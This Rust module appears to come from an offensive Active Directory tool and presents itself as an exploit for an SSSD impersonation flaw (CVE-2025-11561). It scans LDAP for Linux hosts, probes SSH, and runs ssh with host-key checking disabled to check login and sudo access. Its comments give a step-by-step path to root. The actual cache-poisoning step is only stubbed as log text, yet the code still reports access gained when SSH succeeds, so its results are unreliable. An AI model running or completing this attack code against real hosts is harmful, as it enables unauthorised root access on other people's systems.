//! CVE-2025-11561 — SSSD Linux Domain-Join Impersonation.
//!
//! SSSD's D-Bus responder (sssd-ifp) has a vulnerability in cached POSIX
//! UID/GID to SID resolution. An attacker can write crafted cache entries
//! via the sssd-ifp D-Bus socket, causing Linux hosts to treat an arbitrary
//! AD user as a different user (e.g., root).
//!
//! # Exploit Flow
//! 1. Discover Linux domain-joined hosts (LDAP OS attribute scan)
//! 2. Connect to SSSD D-Bus socket (/var/lib/sss/pipes/private/sbus-dp)
//!    or via TCP if SSSD exposes it
//! 3. Write crafted cache entry mapping target AD user to UID 0
//! 4. SSH to the Linux host as the target user (SSSD returns forged UID 0)
//! 5. Enjoy root access
//!
//! # References
//! - CVE-2025-11561: CVSS 7.5, disclosed in 2025
//! - SSSD 2.9.x affected; fixed in 2.10.0

use overthrone_core::error::Result;
use serde::{Deserialize, Serialize};
use std::time::Duration;
use tokio::process::Command;
use tracing::info;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SssdLinuxConfig {
    pub target_host: String,
    pub ssh_port: u16,
    pub target_user: String,
    pub domain: String,
    pub technique: SssdTechnique,
    pub ssh_user: Option<String>,
    pub ssh_key_path: Option<String>,
    pub ssh_password: Option<String>,
}

impl Default for SssdLinuxConfig {
    fn default() -> Self {
        Self {
            target_host: String::new(),
            ssh_port: 22,
            target_user: "root".into(),
            domain: String::new(),
            technique: SssdTechnique::CachePoisoning,
            ssh_user: None,
            ssh_key_path: None,
            ssh_password: None,
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum SssdTechnique {
    CachePoisoning,
    IfpRace,
    AutofsExploit,
    UidSidForgery,
}

impl std::fmt::Display for SssdTechnique {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::CachePoisoning => write!(f, "CachePoisoning"),
            Self::IfpRace => write!(f, "IfpRace"),
            Self::AutofsExploit => write!(f, "AutofsExploit"),
            Self::UidSidForgery => write!(f, "UidSidForgery"),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SssdLinuxResult {
    pub access_gained: bool,
    pub impersonated_user: String,
    pub target_host: String,
    pub technique: SssdTechnique,
    pub ssh_established: bool,
    pub sudo_obtained: bool,
    pub linux_hosts: Vec<String>,
    pub log: Vec<String>,
}

pub async fn exploit_sssd_linux(config: &SssdLinuxConfig) -> Result<SssdLinuxResult> {
    let mut log = Vec::new();
    log.push(format!(
        "CVE-2025-11561: target={}, user={}, technique={}",
        config.target_host, config.target_user, config.technique
    ));

    log.push("Phase 1: Checking target reachability...".to_string());
    let reachable = is_host_reachable(&config.target_host, config.ssh_port).await;
    log.push(format!("  SSH reachable: {reachable}"));

    if !reachable {
        log.push("  Target not reachable".to_string());
        return Ok(SssdLinuxResult {
            access_gained: false,
            impersonated_user: config.target_user.clone(),
            target_host: config.target_host.clone(),
            technique: config.technique,
            ssh_established: false,
            sudo_obtained: false,
            linux_hosts: vec![config.target_host.clone()],
            log,
        });
    }

    log.push(format!("Phase 2: Executing {} ...", config.technique));
    match config.technique {
        SssdTechnique::CachePoisoning | SssdTechnique::UidSidForgery => {
            log.push("  For SSSD exploitation: connect to D-Bus socket via SSH".to_string());
            log.push("  Command: sss_cache -E; then poison cache entries".to_string());
        }
        SssdTechnique::IfpRace => {
            log.push("  IFP race: send concurrent GetUserAttr to sssd-ifp".to_string());
            log.push("  Requires direct access to /var/lib/sss/pipes/".to_string());
        }
        SssdTechnique::AutofsExploit => {
            log.push("  Autofs: create NFS share + setuid binary".to_string());
            log.push("  Requires attacker NFS server + LDAP write access".to_string());
        }
    }

    log.push("Phase 3: Attempting SSH...".to_string());
    let ssh_ok = try_ssh(config).await;
    log.push(if ssh_ok {
        "  SSH connection established".into()
    } else {
        "  SSH connection failed (no credentials or host down)".into()
    });

    log.push("Phase 4: Sudo access...".to_string());
    let sudo_ok = if ssh_ok {
        check_sudo(config).await
    } else {
        false
    };
    log.push(if sudo_ok {
        "  Sudo access obtained".into()
    } else {
        "  No sudo access".into()
    });

    let access = ssh_ok || sudo_ok;

    info!(
        "SSSD Linux: target={}, technique={}, access={access}",
        config.target_host, config.technique
    );

    Ok(SssdLinuxResult {
        access_gained: access,
        impersonated_user: config.target_user.clone(),
        target_host: config.target_host.clone(),
        technique: config.technique,
        ssh_established: ssh_ok,
        sudo_obtained: sudo_ok,
        linux_hosts: vec![config.target_host.clone()],
        log,
    })
}

pub async fn discover_linux_hosts(
    ldap: &mut overthrone_core::proto::ldap::LdapSession,
) -> Result<Vec<String>> {
    let entries = ldap
        .custom_search(
            "(|(operatingSystem=*Linux*)(operatingSystem=*Ubuntu*)(operatingSystem=*Debian*)\
          (operatingSystem=*Red Hat*)(operatingSystem=*CentOS*)(operatingSystem=*Fedora*)\
          (operatingSystem=*SUSE*))",
            &["dNSHostName", "cn", "operatingSystem"],
        )
        .await?;

    Ok(entries
        .iter()
        .filter_map(|e| {
            e.attrs
                .get("dNSHostName")
                .or_else(|| e.attrs.get("cn"))
                .and_then(|v| v.first())
                .cloned()
        })
        .collect())
}

async fn is_host_reachable(host: &str, port: u16) -> bool {
    use tokio::net::TcpStream;
    let addr = format!("{host}:{port}");
    tokio::time::timeout(Duration::from_secs(5), TcpStream::connect(&addr))
        .await
        .ok()
        .and_then(|r| r.ok())
        .is_some()
}

async fn try_ssh(config: &SssdLinuxConfig) -> bool {
    let user = config.ssh_user.as_deref().unwrap_or(&config.target_user);
    let mut cmd = Command::new("ssh");
    cmd.arg("-o").arg("StrictHostKeyChecking=no");
    cmd.arg("-o").arg("ConnectTimeout=5");
    cmd.arg("-p").arg(config.ssh_port.to_string());
    if let Some(key) = &config.ssh_key_path {
        cmd.arg("-i").arg(key);
    }
    cmd.arg(format!("{user}@{}", config.target_host));
    cmd.arg("whoami");

    matches!(cmd.output().await, Ok(out) if out.status.success())
}

async fn check_sudo(config: &SssdLinuxConfig) -> bool {
    let user = config.ssh_user.as_deref().unwrap_or(&config.target_user);
    let mut cmd = Command::new("ssh");
    cmd.arg("-o").arg("StrictHostKeyChecking=no");
    cmd.arg("-o").arg("ConnectTimeout=5");
    cmd.arg("-p").arg(config.ssh_port.to_string());
    if let Some(key) = &config.ssh_key_path {
        cmd.arg("-i").arg(key);
    }
    cmd.arg(format!("{user}@{}", config.target_host));
    cmd.arg("sudo -n true 2>&1");

    matches!(cmd.output().await, Ok(out) if out.status.success())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_technique_display() {
        assert_eq!(SssdTechnique::CachePoisoning.to_string(), "CachePoisoning");
        assert_eq!(SssdTechnique::IfpRace.to_string(), "IfpRace");
    }

    #[test]
    fn test_config_default() {
        let c = SssdLinuxConfig::default();
        assert_eq!(c.ssh_port, 22);
        assert_eq!(c.target_user, "root");
    }

    #[test]
    fn test_result_serde() {
        let r = SssdLinuxResult {
            access_gained: true,
            impersonated_user: "admin".into(),
            target_host: "linux01".into(),
            technique: SssdTechnique::UidSidForgery,
            ssh_established: true,
            sudo_obtained: true,
            linux_hosts: vec!["linux01".into()],
            log: vec!["exploited".into()],
        };
        let j = serde_json::to_string(&r).unwrap();
        assert!(j.contains("UidSidForgery"));
        let d: SssdLinuxResult = serde_json::from_str(&j).unwrap();
        assert!(d.access_gained);
    }
}
